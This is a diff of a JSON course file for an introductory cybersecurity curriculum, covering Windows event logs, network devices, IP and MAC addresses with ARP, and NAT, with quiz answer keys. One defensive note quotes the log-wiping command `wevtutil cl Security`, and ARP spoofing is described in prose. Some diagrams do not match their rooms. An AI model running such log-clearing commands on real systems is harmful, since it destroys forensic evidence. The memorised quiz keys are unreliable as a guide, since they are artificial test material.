+        "content": "Whenever an event occurs on Windows\u2014a user logs in, a password fails, a new service is installed\u2014an entry is written to an event log in `C:\\Windows\\System32\\winevt\\Logs\\` in binary XML format (`.evtx`).\n\nThe 3 primary logs are:\n1. **Application Log**: Events logged by applications or programs (database errors, crashes).\n2. **System Log**: Events logged by Windows operating system components (driver failures, reboots).\n3. **Security Log**: Auditing events (logins, privilege rights usage, file access)."
+      },
+      {
+        "title": "3. The Must-Know Windows Security Event IDs",
+        "content": "Every SOC analyst and incident responder memorizes these Event IDs:\n\n| Event ID | Description | Security Significance |\n|---|---|---|\n| **4624** | Successful Logon | Tracks who logged in, when, and logon type (Type 2 = Interactive console, Type 3 = Network share, Type 10 = Remote Desktop RDP). |\n| **4625** | Failed Logon | A sudden surge of 4625 events indicates an active password brute-force or password-spraying attack! |\n| **4688** | A new process has been created | Tracks the full command-line of newly spawned programs. |\n| **4672** | Special privileges assigned to new logon | Indicates a user logged in with Administrator rights. |\n| **4720** | A user account was created | Detects unauthorized backdoor account creation by an attacker. |"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Querying Event Logs via PowerShell",
+        "codeOrDiagram": "PS C:\\> Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 2\n\n   ProviderName: Microsoft-Windows-Security-Auditing\nTimeCreated                     Id LevelDisplayName Message\n-----------                     -- ---------------- -------\n10/15/2026 11:22:10 AM        4625 Information      An account failed to log on.\n                                                    Account: admin\n                                                    Failure Reason: Unknown user name or bad password.",
+        "explanation": "`Get-WinEvent` queries the binary Security log for failed logon events (Event ID 4625)."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `wevtutil qe Security /c:1 /rd:true /f:text` to simulate reading the latest security audit event:",
+      "initialCommand": "",
+      "expectedCommand": "wevtutil qe Security /c:1 /rd:true /f:text",
+      "simulatedOutput": "Event[0]:\n  Log Name: Security\n  Source: Microsoft-Windows-Security-Auditing\n  Event ID: 4624\n  Task: Logon\n  Level: Information\n  Description: An account was successfully logged on. TargetUserName: cadet\n[+] Log inspection complete: Successful logon (Event ID 4624) recorded.",
+      "explanation": "`wevtutil` is the Windows command-line utility for querying and managing event logs."
+    },
+    "questions": [
+      {
+        "id": "q-19-1",
+        "type": "exact",
+        "question": "Which Windows Security Event ID is logged when an authentication attempt fails due to an invalid password or username?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "4625"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Four digits: 4625.",
+        "explanation": "Event ID 4625 records failed logon attempts in the Windows Security Log."
+      },
+      {
+        "id": "q-19-2",
+        "type": "multiple-choice",
+        "question": "Which Windows security component provides an interface allowing antivirus solutions to scan scripts and macros inside memory after they are unpacked?",
+        "options": [
+          "BitLocker",
+          "AMSI (Antimalware Scan Interface)",
+          "Syskey",
+          "NTFS Journal"
+        ],
+        "correctIndex": 1,
+        "hint": "Antimalware Scan Interface abbreviation.",
+        "explanation": "AMSI allows applications like PowerShell to pass dynamic in-memory code directly to antivirus scanners."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Read latest security audit event",
+        "instruction": "Execute `wevtutil qe Security /c:1 /rd:true /f:text` in the terminal.",
+        "hints": [
+          "Type: `wevtutil qe Security /c:1 /rd:true /f:text`"
+        ]
+      }
+    ],
+    "securityConnection": "Attackers frequently attempt to clear Windows event logs using `wevtutil cl Security` to hide evidence of their intrusions. SOC detection rules trigger high-severity alerts whenever the event log service is stopped or when Event ID 1102 ('The audit log was cleared') is detected!",
+    "id": "room-19",
+    "nextRoomId": "room-20"
+  },
+  {
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "What is a Network? Topologies & Physical Devices",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Level 3: Windows Fundamentals",
+    "whyAreYouHere": "Computer networking is the foundational backbone of cybersecurity. A standalone computer cannot be hacked remotely; attacks require a network connection. In this room, you will learn how networks connect devices, distinguish between LANs and WANs, understand network topologies (Star, Mesh), and identify core devices like Switches, Routers, and Firewalls.",
+    "objectives": [
+      "Define what a computer network is and why protocols are required",
+      "Differentiate Local Area Networks (LAN), Wide Area Networks (WAN), and Wireless LANs (WLAN)",
+      "Understand physical network topologies: Star, Mesh, Bus, and Ring",
+      "Identify primary networking hardware: Hubs (legacy), Switches, Routers, Access Points, and Firewalls",
+      "Understand the difference between Layer 2 switching (MAC) and Layer 3 routing (IP)"
+    ],
+    "vocabulary": [
+      {
+        "term": "LAN (Local Area Network)",
+        "definition": "A network covering a small geographic area like a home, office, or school building."
+      },
+      {
+        "term": "WAN (Wide Area Network)",
+        "definition": "A network connecting multiple LANs across large geographical regions, cities, or continents (the Internet is the largest WAN)."
+      },
+      {
+        "term": "Switch",
+        "definition": "A Layer 2 networking device that forwards traffic intelligently between devices on the same local network using MAC addresses."
+      },
+      {
+        "term": "Router",
+        "definition": "A Layer 3 device that routes data packets between different independent networks using IP addresses."
+      },
+      {
+        "term": "Firewall",
+        "definition": "A security barrier that monitors and controls incoming and outgoing network traffic based on predetermined security rules."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 200\" width=\"100%\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <line x1=\"120\" y1=\"30\" x2=\"120\" y2=\"180\" stroke=\"#38bdf8\" stroke-width=\"3\"/>\n  <text x=\"120\" y=\"22\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Client (You)</text>\n  \n  <line x1=\"480\" y1=\"30\" x2=\"480\" y2=\"180\" stroke=\"#10b981\" stroke-width=\"3\"/>\n  <text x=\"480\" y=\"22\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Target Server</text>\n\n  <!-- Step 1 SYN -->\n  <line x1=\"120\" y1=\"60\" x2=\"480\" y2=\"80\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <polygon points=\"480,80 470,75 470,85\" fill=\"#f59e0b\"/>\n  <text x=\"300\" y=\"65\" fill=\"#f59e0b\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">1. SYN (Synchronize seq=100)</text>\n\n  <!-- Step 2 SYN-ACK -->\n  <line x1=\"480\" y1=\"105\" x2=\"120\" y2=\"125\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"120,125 130,120 130,130\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"110\" fill=\"#38bdf8\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">2. SYN-ACK (ack=101 seq=300)</text>\n\n  <!-- Step 3 ACK -->\n  <line x1=\"120\" y1=\"150\" x2=\"480\" y2=\"170\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"480,170 470,165 470,175\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"155\" fill=\"#10b981\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">3. ACK (Connection Established)</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. What is a Network?",
+        "content": "A **computer network** is two or more computing devices connected by physical cables (copper Ethernet, glass fiber-optics) or wireless radio waves (Wi-Fi, cellular) to share data and resources.\n\n\u2022 **LAN (Local Area Network)**: Your home Wi-Fi network or corporate office floor.\n\u2022 **WAN (Wide Area Network)**: Connects distant LANs together over miles or oceans. The global Internet is a giant network of interconnected WANs.\n\u2022 **WLAN (Wireless LAN)**: A LAN that uses Wi-Fi radio frequencies (2.4 GHz, 5 GHz, 6 GHz) instead of physical cables."
+      },
+      {
+        "title": "2. Network Topologies: How Devices Are Arranged",
+        "content": "\u2022 **Star Topology**: The dominant modern standard. Every workstation connects directly to a central Switch. If one cable is severed, only that one computer loses connection; everyone else remains online.\n\u2022 **Mesh Topology**: Devices have multiple redundant links to each other. Used in the Internet backbone and high-security datacenters. If router A fails, traffic automatically reroutes through router B.\n\u2022 **Bus / Ring (Legacy)**: Older topologies where a single cable break took down the entire office network."
+      },
+      {
+        "title": "3. The Hardware: Hub vs Switch vs Router vs Firewall",
+        "content": "\u2022 **Hub (Obsolete/Insecure)**: Repeats incoming electrical signals to ALL ports simultaneously! Anyone plugged into a hub can sniff everyone else's passwords!\n\u2022 **Switch (Layer 2)**: Intelligent! Learns physical MAC addresses and sends frames ONLY to the specific port of the intended recipient.\n\u2022 **Router (Layer 3)**: The gateway between networks. Connects your home LAN (`192.168.1.0/24`) to the public Internet.\n\u2022 **Firewall**: The security gatekeeper. Inspects packets and drops unauthorized connections (e.g. blocking incoming port 445 SMB connections from the public web)."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Viewing Local Network Interfaces in Linux",
+        "codeOrDiagram": "cadet@endlessus:~$ ip link show\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP\n    link/ether 02:42:0a:0a:14:0f brd ff:ff:ff:ff:ff:ff",
+        "explanation": "`ip link show` displays active physical and virtual network interfaces and their hardware MAC addresses."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `ip link` to list the physical and loopback network interfaces on the system:",
+      "initialCommand": "",
+      "expectedCommand": "ip link",
+      "simulatedOutput": "1: lo: <LOOPBACK,UP> mtu 65536 state UP\n2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 state UP link/ether 02:42:0a:0a:14:0f\n[+] Network interfaces listed: eth0 (Ethernet adapter) is UP.",
+      "explanation": "`ip link` shows the Layer 2 status and MAC addresses of network devices."
+    },
+    "questions": [
+      {
+        "id": "q-20-1",
+        "type": "exact",
+        "question": "Which Layer 2 networking device forwards data frames between computers on the same local network using MAC addresses?",
+        "visualSlots": "_ _ _ _ _ _",
+        "acceptedAnswers": [
+          "switch"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Six letters: s-w-i-t-c-h.",
+        "explanation": "A network switch operates at Layer 2 to deliver frames to specific MAC addresses."
+      },
+      {
+        "id": "q-20-2",
+        "type": "multiple-choice",
+        "question": "What is the primary difference between a network Hub and a network Switch?",
+        "options": [
+          "A switch transmits wireless signals while a hub uses cables",
+          "A hub broadcasts all traffic to every connected port, whereas a switch directs traffic only to the destination MAC address port",
+          "A hub encrypts traffic with AES-256 while a switch does not",
+          "A switch is only used on Wide Area Networks"
+        ],
+        "correctIndex": 1,
+        "hint": "Hubs repeat to all ports; switches send only to the intended recipient.",
+        "explanation": "Hubs blindly broadcast all incoming frames to every port, creating security and collision risks; switches maintain a MAC address table to route frames selectively."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect network interfaces",
+        "instruction": "Execute `ip link` in the terminal.",
+        "hints": [
+          "Type: `ip link`"
+        ]
+      }
+    ],
+    "securityConnection": "In 'ARP Spoofing' or 'Man-in-the-Middle' (MitM) attacks, an attacker on a switched local network sends fake ARP responses to trick computers into routing their traffic through the attacker's machine before reaching the router, effectively converting a switch into an insecure hub.",
+    "id": "room-20",
+    "nextRoomId": "room-21"
+  },
+  {
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "IP Addresses, IPv4 & Physical MAC Addresses",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 20: What is a Network? Topologies & Physical Devices",
+    "whyAreYouHere": "To send a physical letter, you need both a street address (logical location) and a name (physical recipient). In networking, these correspond to your **IP Address** (logical Layer 3 address) and your **MAC Address** (physical Layer 2 hardware address). In this room, you will learn how IPv4 addresses are structured in binary and how the Address Resolution Protocol (ARP) glues them together.",
+    "objectives": [
+      "Understand the structure of an IPv4 address (32 bits, 4 octets, dotted-decimal notation)",
+      "Convert binary octets into decimal (e.g. `11000000` = `192`)",
+      "Learn the structure of a MAC address (48 bits, 6 hexadecimal pairs, OUI vendor prefix)",
+      "Understand why both MAC addresses and IP addresses are necessary",
+      "Learn how the Address Resolution Protocol (ARP) maps IP addresses to MAC addresses"
     ],
     "vocabulary": [
       {
         "term": "IPv4 Address",
-        "definition": "A 32-bit numerical label written as four octets separated by dots (e.g., `192.168.1.10`), uniquely identifying a device on a network."
+        "definition": "A 32-bit logical numerical label assigned to each device participating in an IP computer network (e.g. 192.168.1.1)."
       },
       {
-        "term": "IPv6 Address",
-        "definition": "A 128-bit address written in hexadecimal (e.g., `2001:0db8::1`), created to replace IPv4 due to global address exhaustion."
+        "term": "Octet",
+        "definition": "An 8-bit section of an IPv4 address, with values ranging from 0 to 255 in decimal notation."
       },
       {
-        "term": "Private IP (RFC 1918)",
-        "definition": "Non-routable IP ranges reserved for local internal networks: `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16`."
+        "term": "MAC Address (Media Access Control)",
+        "definition": "A 48-bit unique physical hardware identifier permanently burned into a Network Interface Card (NIC)."
       },
       {
-        "term": "Public IP",
-        "definition": "A globally unique IP assigned to your router by your ISP that can be reached from anywhere on the public Internet."
-      },
-      {
-        "term": "Localhost (`127.0.0.1`)",
-        "definition": "The loopback address that refers back to the local machine you are currently operating on."
-      },
-      {
-        "term": "MAC Address",
-        "definition": "Media Access Control address: a permanent 48-bit hardware identifier burned into your network card (e.g. `00:1A:2B:3C:4D:5E`)."
+        "term": "OUI (Organizationally Unique Identifier)",
+        "definition": "The first 3 bytes (24 bits) of a MAC address that identify the hardware manufacturer (e.g., Apple, Intel, Cisco)."
       },
       {
         "term": "ARP (Address Resolution Protocol)",
-        "definition": "The protocol used to discover the physical MAC address associated with a known IP address on a local network."
+        "definition": "The protocol used to discover the physical MAC address corresponding to a known target IPv4 address on a local network."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 170\" width=\"100%\" height=\"170\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"20\" y=\"55\" width=\"120\" height=\"60\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"80\" y=\"80\" fill=\"#f8fafc\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Your Browser</text>\n  <text x=\"80\" y=\"100\" fill=\"#94a3b8\" font-size=\"10\" text-anchor=\"middle\">endlessus.in?</text>\n\n  <path d=\"M 140 85 L 220 85\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"220,85 210,80 210,90\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"220\" y=\"30\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"60\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">DNS Resolver (53)</text>\n  <text x=\"300\" y=\"80\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">1. Root Server (.)</text>\n  <text x=\"300\" y=\"100\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">2. TLD Server (.in)</text>\n  <text x=\"300\" y=\"120\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">3. Authoritative DNS</text>\n\n  <path d=\"M 380 85 L 450 85\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"450,85 440,80 440,90\" fill=\"#10b981\"/>\n\n  <rect x=\"450\" y=\"55\" width=\"130\" height=\"60\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"515\" y=\"80\" fill=\"#f8fafc\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Web Server</text>\n  <text x=\"515\" y=\"100\" fill=\"#f59e0b\" font-size=\"10\" text-anchor=\"middle\">104.21.75.12</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Postal Analogy: IP vs MAC",
-        "content": "• **IP Address (Logical)**: Like your postal mailing address: *Building 4, Sector 7, New Delhi*. If you move your laptop to a coffee shop, your IP address changes because your network location changed.\n• **MAC Address (Physical)**: Like your fingerprint or national identity number. It is physically burned into your Network Interface Card (NIC) during manufacturing and never changes, regardless of where you plug in."
+        "title": "1. IPv4 Address Anatomy: 32 Bits in 4 Octets",
+        "content": "An IPv4 address is simply a **32-bit binary number** written as four 8-bit numbers (**octets**) separated by dots:\n\n`192.168.1.10`\n\nLet's convert to binary:\n\u2022 `192` = `11000000` ($128 + 64$)\n\u2022 `168` = `10101000` ($128 + 32 + 8$)\n\u2022 `1` = `00000001`\n\u2022 `10` = `00001010` ($8 + 2$)\n\nBecause each octet has 8 bits, the minimum value is `0` (`00000000`) and the maximum is `255` (`11111111`). You can NEVER have an IP like `192.168.1.300`!"
       },
       {
-        "title": "2. The Private IP Ranges (RFC 1918)",
-        "content": "Because IPv4 only has ~4.3 billion possible addresses, engineers reserved three blocks for internal use:\n1. `10.0.0.0` to `10.255.255.255` (Large corporate enterprise networks)\n2. `172.16.0.0` to `172.31.255.255` (Medium business networks)\n3. `192.168.0.0` to `192.168.255.255` (Home Wi-Fi routers and small labs)\nRouters on the public internet immediately drop any packets carrying a private RFC 1918 address!"
+        "title": "2. MAC Addresses: Physical Hardware Identity",
+        "content": "While your IP address changes whenever you move from home Wi-Fi to a coffee shop, your **MAC Address** is burned directly into your network chip:\n\n`B8:27:EB:A5:42:19`\n\n\u2022 **Length**: 48 bits, displayed as 6 pairs of hexadecimal numbers (0-9, A-F).\n\u2022 **First 3 pairs (`B8:27:EB`)**: The **OUI** identifying the hardware manufacturer (here, Raspberry Pi Foundation).\n\u2022 **Last 3 pairs (`A5:42:19`)**: The unique serial number for that individual network card."
+      },
+      {
+        "title": "3. The Bridge: Address Resolution Protocol (ARP)",
+        "content": "When your computer wants to send data to `192.168.1.1` on the local network, the network switch doesn't understand IP addresses! The switch only understands MAC addresses.\n\nYour computer shouts an **ARP Request** broadcast to everyone on the LAN:\n*\"Who has IP 192.168.1.1? Tell 192.168.1.10!\"*\n\nThe router hears it and replies with an **ARP Reply**:\n*\"192.168.1.1 is at MAC B8:27:EB:A5:42:19!\"*\n\nYour computer stores this mapping in its **ARP Cache**."
       }
     ],
     "seeExamples": [
       {
-        "title": "Private LAN vs Public Internet Addressing",
-        "codeOrDiagram": "[ Device: Laptop ]  Private IP: 192.168.1.15 | MAC: 00:1A:2B:3C:4D:5E\n         ↓ Local LAN\n[ Home Router ]     LAN IP: 192.168.1.1    | Public WAN IP: 203.0.113.45 (via NAT)\n         ↓ Public Internet\n[ Remote Server ]   Public IP: 104.21.55.2 | Web Server (endlessus.in)",
-        "explanation": "Your home devices share one single public IP address through NAT (Network Address Translation). Remote websites only see the public IP of your router."
+        "title": "Viewing the ARP Cache in Linux",
+        "codeOrDiagram": "cadet@endlessus:~$ arp -a\ngateway (192.168.1.1) at b8:27:eb:a5:42:19 [ether] on eth0\nprinter (192.168.1.50) at 00:1e:8f:12:44:90 [ether] on eth0",
+        "explanation": "The `arp -a` command shows all known IP-to-MAC address bindings learned on the local network."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Inspect all network interfaces and IP addresses on this lab system using `ip addr`:",
+      "prompt": "Run `arp -n` to inspect the local ARP table mapping IP addresses to physical MAC addresses:",
       "initialCommand": "",
-      "expectedCommand": "ip addr",
-      "simulatedOutput": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n    link/ether 02:42:0a:0a:0a:05 brd ff:ff:ff:ff:ff:ff\n    inet 10.10.10.5/24 brd 10.10.10.255 scope global eth0\n[+] Success! Interfaces identified: lo (127.0.0.1) and eth0 (10.10.10.5, MAC 02:42:0a:0a:0a:05).",
-      "explanation": "Interface `lo` is loopback. Interface `eth0` is the virtual Ethernet card with IP `10.10.10.5` on subnet `/24`."
+      "expectedCommand": "arp -n",
+      "simulatedOutput": "Address          HWtype  HWaddress           Flags Mask            Iface\n10.10.20.1       ether   00:50:56:ea:24:01   C                     eth0\n10.10.20.15      ether   00:50:56:ea:88:12   C                     eth0\n[+] ARP cache inspected: Resolved local IP 10.10.20.1 to MAC 00:50:56:ea:24:01.",
+      "explanation": "`arp -n` lists the active Layer 2 to Layer 3 address resolution table."
     },
     "questions": [
       {
-        "id": "r7-q1",
+        "id": "q-21-1",
+        "type": "exact",
+        "question": "How many total bits make up an IPv4 address?",
+        "visualSlots": "_ _",
+        "acceptedAnswers": [
+          "32",
+          "32 bits"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "4 octets times 8 bits per octet.",
+        "explanation": "An IPv4 address consists of 32 bits divided into 4 eight-bit octets."
+      },
+      {
+        "id": "q-21-2",
+        "type": "exact",
+        "question": "Which protocol resolves a known local IP address into its corresponding physical MAC hardware address?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "ARP",
+          "Address Resolution Protocol"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Address Resolution Protocol abbreviation.",
+        "explanation": "ARP maps Layer 3 IP addresses to Layer 2 MAC addresses."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect ARP table",
+        "instruction": "Execute `arp -n` in the terminal.",
+        "hints": [
+          "Type: `arp -n`"
+        ]
+      }
+    ],
+    "securityConnection": "Because ARP has no authentication, attackers on a local network can send unsolicited fake ARP replies ('Gratuitous ARP') claiming *they* own the default gateway's IP address. All network computers then send their outbound traffic directly to the attacker!",
+    "id": "room-21",
+    "nextRoomId": "room-22"
+  },
+  {
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "Private vs Public IP Addresses & NAT",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 21: IP Addresses, IPv4 & Physical MAC Addresses",
+    "whyAreYouHere": "IPv4 has a fundamental problem: 32 bits only provides $2^{32} \\approx 4.29$ billion addresses. With billions of humans and tens of billions of smartphones, laptops, and IoT devices, the world ran out of unique IPv4 addresses years ago! In this room, you will learn about the RFC 1918 private IP address ranges and discover how Network Address Translation (NAT) saved the internet.",
+    "objectives": [
+      "Understand the IPv4 address exhaustion crisis",
+      "Learn the three designated RFC 1918 Private IP address ranges (Class A, B, and C)",
+      "Differentiate between Public (Globally Routable) and Private (Local-Only) IP addresses",
+      "Understand how Network Address Translation (NAT) multiplexes multiple private devices over one public IP",
+      "Learn about the loopback address (`127.0.0.1` / `localhost`)"
+    ],
+    "vocabulary": [
+      {
+        "term": "Public IP Address",
+        "definition": "A globally unique IP address registered with IANA and routable across the entire worldwide Internet."
+      },
+      {
+        "term": "Private IP Address (RFC 1918)",
+        "definition": "IP ranges reserved strictly for private internal networks. Routers on the public internet drop them immediately."
+      },
+      {
+        "term": "NAT (Network Address Translation)",
+        "definition": "A technique used by routers to translate multiple private internal IP addresses into a single public IP address using port numbers."
+      },
+      {
+        "term": "Loopback Address (127.0.0.1)",
+        "definition": "A special IP address that routes network traffic back into the local machine itself ('localhost')."
+      },
+      {
+        "term": "Default Gateway",
+        "definition": "The IP address of the local router interface that devices send traffic to when the destination is outside their local subnet."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 170\" width=\"100%\" height=\"170\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"20\" y=\"55\" width=\"120\" height=\"60\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"80\" y=\"80\" fill=\"#f8fafc\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Your Browser</text>\n  <text x=\"80\" y=\"100\" fill=\"#94a3b8\" font-size=\"10\" text-anchor=\"middle\">endlessus.in?</text>\n\n  <path d=\"M 140 85 L 220 85\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"220,85 210,80 210,90\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"220\" y=\"30\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"60\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">DNS Resolver (53)</text>\n  <text x=\"300\" y=\"80\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">1. Root Server (.)</text>\n  <text x=\"300\" y=\"100\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">2. TLD Server (.in)</text>\n  <text x=\"300\" y=\"120\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">3. Authoritative DNS</text>\n\n  <path d=\"M 380 85 L 450 85\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"450,85 440,80 440,90\" fill=\"#10b981\"/>\n\n  <rect x=\"450\" y=\"55\" width=\"130\" height=\"60\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"515\" y=\"80\" fill=\"#f8fafc\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Web Server</text>\n  <text x=\"515\" y=\"100\" fill=\"#f59e0b\" font-size=\"10\" text-anchor=\"middle\">104.21.75.12</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. The Three Private IP Ranges (RFC 1918)",
+        "content": "To prevent address exhaustion, the Internet Engineering Task Force (IETF) created **RFC 1918**, reserving three blocks of IP addresses for internal private networks:\n\n1. **Class A Range**: `10.0.0.0` to `10.255.255.255` (Prefix: `10.0.0.0/8`). Used in large enterprise datacenters (16.7 million addresses).\n2. **Class B Range**: `172.16.0.0` to `172.31.255.255` (Prefix: `172.16.0.0/12`). Used in universities and medium businesses (1 million addresses).\n3. **Class C Range**: `192.168.0.0` to `192.168.255.255` (Prefix: `192.168.0.0/16`). Used in almost all home Wi-Fi routers (65,536 addresses).\n\nMillions of homes all use `192.168.1.1` at the same time without conflict because private IPs never cross the public internet!"
+      },
+      {
+        "title": "2. How NAT (Network Address Translation) Works",
+        "content": "When your phone (`192.168.1.45`) wants to load a page from a server on the web (`104.21.75.12`), it sends the packet to your home router:\n\n1. The router rewrites the source IP from `192.168.1.45` to its single **Public IP** (e.g. `203.0.113.88`).\n2. The router assigns a unique source port number (e.g. `54210`) and notes this in its **NAT Translation Table**.\n3. When the web server replies to `203.0.113.88:54210`, the router checks its table, translates the destination back to `192.168.1.45`, and forwards the packet into your home Wi-Fi!\n\nThis is why 20 devices in a home share one single public IP address."
+      },
+      {
+        "title": "3. The Loopback Address: 127.0.0.1 (Localhost)",
+        "content": "The entire `127.0.0.0/8` range is reserved for **loopback testing**.\n\nWhen you send traffic to `127.0.0.1` (or the domain name `localhost`), packets never touch a physical network card or cable\u2014the kernel loops the packets directly into internal memory. Web developers use localhost to test web servers privately before publishing them to the world."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Checking Default Gateway and IP in Linux",
+        "codeOrDiagram": "cadet@endlessus:~$ ip route show\ndefault via 192.168.1.1 dev eth0 proto dhcp metric 100\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.10\n\ncadet@endlessus:~$ ping -c 1 127.0.0.1\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms",
+        "explanation": "`ip route` shows the default gateway router (`192.168.1.1`). Pinging `127.0.0.1` tests the local TCP/IP stack."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `ip route` in the terminal to inspect the active routing table and default gateway:",
+      "initialCommand": "",
+      "expectedCommand": "ip route",
+      "simulatedOutput": "default via 10.10.20.1 dev eth0\n10.10.20.0/24 dev eth0 proto kernel scope link src 10.10.20.15\n[+] Routing table inspected: Default gateway is 10.10.20.1.",
+      "explanation": "`ip route` shows outbound routing paths and the gateway router IP."
+    },
+    "questions": [
+      {
+        "id": "q-22-1",
+        "type": "exact",
+        "question": "What standard IPv4 address is universally designated as the local loopback address (localhost)?",
+        "visualSlots": "_ _ _ . _ . _ . _",
+        "acceptedAnswers": [
+          "127.0.0.1"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Starts with 127, ends with 1.",
+        "explanation": "127.0.0.1 is the standard loopback address."
+      },
+      {
+        "id": "q-22-2",
         "type": "multiple-choice",
-        "question": "Which of the following IP addresses is a private (RFC 1918) address used for internal local networks?",
+        "question": "Which of the following IP addresses is a private, non-routable address under RFC 1918?",
         "options": [
           "8.8.8.8",
-          "192.168.1.45",
-          "142.250.190.46",
-          "1.1.1.1"
+          "192.168.1.50",
+          "1.1.1.1",
+          "151.101.1.140"
         ],
         "correctIndex": 1,
-        "explanation": "`192.168.1.45` falls squarely within the RFC 1918 Class C private range (`192.168.0.0/16`). The others are public IP addresses."
-      },
-      {
-        "id": "r7-q2",
-        "type": "multiple-choice",
-        "question": "What protocol is used on a local network to discover the Layer 2 hardware MAC address that corresponds to an IP address?",
-        "options": [
-          "DNS (Domain Name System)",
-          "DHCP (Dynamic Host Configuration Protocol)",
-          "ARP (Address Resolution Protocol)",
-          "BGP (Border Gateway Protocol)"
